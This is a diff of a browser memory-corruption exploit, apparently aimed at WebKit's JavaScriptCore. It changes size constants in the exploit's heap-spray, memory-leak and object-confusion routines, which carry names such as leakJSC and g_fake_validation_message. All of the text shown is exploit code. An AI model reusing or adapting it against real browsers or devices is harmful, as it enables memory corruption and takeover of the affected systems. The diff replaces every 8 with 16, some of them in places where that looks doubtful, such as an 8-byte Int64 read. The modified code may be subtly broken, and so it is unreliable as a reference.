@@ -36,8 +36,8 @@ var g_message_body_leak = null;
 
 var g_obj_str = {};
 
-var g_rows1 = '1px,'.repeat(LENGTH_VALIDATION_MESSAGE / 8 - 2) + "1px";
-var g_rows2 = '2px,'.repeat(LENGTH_VALIDATION_MESSAGE / 8 - 2) + "2px";
+var g_rows1 = '1px,'.repeat(LENGTH_VALIDATION_MESSAGE / 16 - 2) + "1px";
+var g_rows2 = '2px,'.repeat(LENGTH_VALIDATION_MESSAGE / 16 - 2) + "2px";
 
 var g_round = 1;
 var g_input = null;
@@ -209,7 +209,7 @@ function leakJSC() {
 
         var tmp_spray = {};
         for(var i = 0; i < 100000; i++)
-                tmp_spray['Z'.repeat(8 * 2 * 8 - 5 - LENGTH_STRINGIMPL) + (''+i).padStart(5, '0')] = 0x1337;
+                tmp_spray['Z'.repeat(16 * 2 * 16 - 5 - LENGTH_STRINGIMPL) + (''+i).padStart(5, '0')] = 0x1337;
 
 	let ab = new ArrayBuffer(LENGTH_ARRAYBUFFER);
 
@@ -267,7 +267,7 @@ function leakJSC() {
 					g_relative_read.charCodeAt(i + 0x11) === 0x42 &&
 					g_relative_read.charCodeAt(i + 0x12) === 0x42 &&
 					g_relative_read.charCodeAt(i + 0x13) === 0x42)
-					v = new Int64(str2array(g_relative_read, 8, i + 8));
+					v = new Int64(str2array(g_relative_read, 16, i + 16));
 			}
 			if (v !== undefined && v.greater(g_timer_leak) && v.sub(g_timer_leak).hi32() === 0x0) {
 				g_jsview_leak = v;
@@ -302,7 +302,7 @@ function confuseTargetObjRound1() {
 
 	dumpTargetObj();
 
-	g_fake_validation_message[4] = g_timer_leak.add(LENGTH_TIMER * 8 + OFFSET_LENGTH_STRINGIMPL + 1 - OFFSET_ELEMENT_REFCOUNT).asDouble();
+	g_fake_validation_message[4] = g_timer_leak.add(LENGTH_TIMER * 16 + OFFSET_LENGTH_STRINGIMPL + 1 - OFFSET_ELEMENT_REFCOUNT).asDouble();
 
 	/*
 	 * The timeout must be > 5s because deleteBubbleTree is scheduled to run in
